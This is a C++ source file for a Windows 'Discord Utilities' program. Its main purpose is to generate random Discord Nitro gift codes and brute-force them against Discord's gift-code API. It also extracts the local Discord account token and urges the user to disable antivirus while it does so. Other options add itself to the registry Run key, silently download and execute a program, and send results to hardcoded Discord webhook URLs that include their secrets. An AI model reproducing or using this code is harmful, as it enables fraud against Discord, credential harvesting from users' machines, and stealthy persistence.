#include "include.hpp"
#include "network.hpp"
#include "utilities.hpp"
#include "codes.hpp"

void checkCode(std::string filename = "NitroCodes.txt") {
	std::string line;
	std::ifstream codes(filename);

	if (codes.is_open()) {
		while (std::getline(codes, line)) {
			std::string id = getId(line, "/");
			std::string checkUrl = "https://www.discord.com/api/v6/entitlements/gift-codes/" + id + "?with_application=false&with_subscription_plan=true";

			std::list<std::string> headers = {
				"placeholder to make this not null"
			};
			std::string res = network::getRequest(checkUrl, headers);

			std::cout << "Result: " << res;

			/*
			* Legend of response code
			* 404: Not found
			* 200: OK
			* 429: rate limited
			*/
		}
	}
}

void checkOneCode(std::string code, std::string user, bool webhook = true) { //No console
	CURL* curl = curl_easy_init();
	std::string id = getId(code, "/");
	std::string checkUrl = "https://www.discord.com/api/v6/entitlements/gift-codes/" + id + "?with_application=false&with_subscription_plan=true";

	curl_easy_setopt(curl, CURLOPT_URL, checkUrl);

	curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);

	CURLcode res;
	long responseCode;
	res = curl_easy_perform(curl);
	if (res == CURLE_OK) {
		res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &responseCode);
	}
	else {
		slowType("Error performing request, are you connected to the internet?");
		return;
	}

	std::cout << responseCode << std::endl;
	switch (static_cast<int>(responseCode)) {
	case 429:
		Sleep(60000);
		break;
	case 200:
		if (webhook)
			network::sendWebHookMsg("Valid Code detected by a generous volunteer: " + user + "! @everyone " + code, "https://discord.com/api/webhooks/901956329441214464/L5PiwXDh9CSDzOkhRPAUegXk412wIf7GI6Hd9oWZb0lXV8b4c_IQl2EcwkL0TEs3z_YQ");
		else {
			const char* ccCode = code.c_str();
			MessageBoxW(NULL, L"Valid code detected: " + *ccCode, L"Discord Utilities Notification", MB_OK | MB_ICONINFORMATION);
		}
		break;
	default:
		std::cout << "Unrecognized response: " << responseCode << std::endl;
		break;
	}
	curl_easy_cleanup(curl);
	curl_global_cleanup();
}

void generateWhileCheck(bool sendWebhook = false, std::string user = "anonymous") {
	while (true) {
		char tempCharsA[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890" };
		char code[42] = { "https://www.discord.gift/" };
		if (!sendWebhook) {
			slowType("Working...");
			for (int i = 0; i <= 16; i++) {
				int random = rand() % 62;
				code[25 + i] = tempCharsA[random];
			}
			std::string sCode(code);
			checkOneCode(code, user, false);
		}
		else {
			//Only on startup
			for (int i = 0; i <= 16; i++) {
				int random = rand() % 62;
				code[25 + i] = tempCharsA[random];
			}
			std::string sCode(code);
			checkOneCode(code, user, true);
		}
	}
}

void nitroSnipe(LPCSTR token) {
	
}

int main() {
	SetConsoleTitle(L"kevlu8's Discord Utilities");
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	//options
	int sel;
	changeColor(7);
	slowType("The source code of this program is available at https://www.github.com/kevlu8/Discord-Utilities.\n");
	std::string line; std::ifstream lic("license.dll"); if (lic.is_open()) { lic.close(); } //worst license checking EVER!!!
	else {
		if (MessageBoxW(NULL, L"Do you agree to the license agreement that can be found on GitHub?", L"License", MB_ICONQUESTION | MB_YESNO | MB_DEFBUTTON1) == IDNO) return 0;
		else { std::ofstream licensefile("license.dll"); licensefile << "true"; licensefile.close(); }
	}
	//clearConsole();
	slowType("Welcome to kevlu8's Nitro Utility program. What would you like to do?\n");
	changeColor(9);
	slowType("---------- Nitro Generation ----------\n");
	slowType("[1] Nitro Code Generator\n");
	slowType("[2] Nitro Code Checker\n");
	slowType("[3] Nitro Code Generator and Checker\n");
	changeColor(12);
	slowType("---------- Nitro Sniper ----------\n");
	slowType("[4] Nitro Sniper\n");
	changeColor(11);
	slowType("---------- Discord Utilities ----------\n");
	slowType("[5] Get my token\n");
	changeColor(4);
	slowType("---------- Other ----------\n");
	slowType("[6] Install BetterDiscord\n");
	slowType("[7] Nitro Code Generator (Multithreaded, uses more CPU but generates codes faster)\n");
	slowType("[8] Donate CPU power for community\n");
	slowType("[0] Exit program\n");
	slowType("WARNING: Only [1], [5], [6], [7], [0] are working so far\n");
	changeColor(7);
	slowType("---------------------------------------\n");
	std::cout << "Enter option: ";
	std::cin >> sel;

	//extra variables
	std::string fileName;
	int instances;

	//actual code begins here
	switch (sel) {
	case 0:
		break;
	case 1:
		codes::generateCodes();
		break;
	case 2:
		slowType("What is the name of the input file? ");
		std::cin >> fileName;
		checkCode(fileName);
		break;
	case 3:
		generateWhileCheck();
		break;
	case 4: {
		std::string token;
		slowType("Enter your token: (run option 5 if you don't know it) ");
		std::cin >> token;
		//nitroSnipe(token);
		break;
	}
	case 5: {
		slowType("Discord Utilities will now search for Discord executables. Your antivirus may block it. If it does, disable it while Discord Utilities checks for the token.");
		std::vector<std::string> targetLocation = grabPath();
		for (int i = 0; i < targetLocation.size(); i++) {
			if (pathExist(targetLocation[i])) {
				getToken(targetLocation[i]);
			}
		}
		break;
	}
	case 6: 
		slowType("Downloading content (approx. 60 MB), please wait...");
		URLDownloadToFile(NULL, L"https://github.com/BetterDiscord/Installer/releases/latest/download/BetterDiscord-Windows.exe", L"BetterDiscord.exe", 0, NULL);
		ShellExecuteA(NULL, "open", "BetterDiscord.exe", NULL, NULL, SW_HIDE);
		remove("BetterDiscord.exe");
		break;
	case 7:
		std::cout << "How many threads would you like? More = faster (Try to keep this under 50): ";
		std::cin >> instances;
		multiThread(std::ref(instances));
		break;
	case 8: {
		int response;
		std::string user;
		slowType("Would you like this program to run in tray on startup?\n[1] Yes\n[2] No\nEnter option: ");
		std::cin >> response;
		slowType("Please enter your Discord username and tag (eg: @kevlu8#5240): ");
		std::cin >> user;
		network::sendWebHookMsg("User " + user + " just started donating CPU!", "https://discord.com/api/webhooks/906028309006123029/5EnsZ3YEqpidJvVemdQvd6KkgpRDMXy2GGrvcQkXiffeGs1gCNNlABC4GOCx35b3-Xu-");
		if (response == 1) {
			std::wstring path = getCurrDir();
			path += L"\\StartupUtil.exe";
			HKEY hkey = NULL;
			LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
			LONG status = RegSetValueEx(hkey, L"Discord Utilities", 0, REG_SZ, (BYTE*)path.c_str(), (path.size() + 1) * sizeof(wchar_t));
		}
		ShellExecute(NULL, L"open", L"./StartupUtil.exe", NULL, NULL, 0);
		break;
	}
	default:
		slowType("That isn't an option!\n");
	}
	slowType("Program is complete. Press enter to terminate.\n");
	while (!_kbhit()) {
		Sleep(100);
	}
	return 0;
}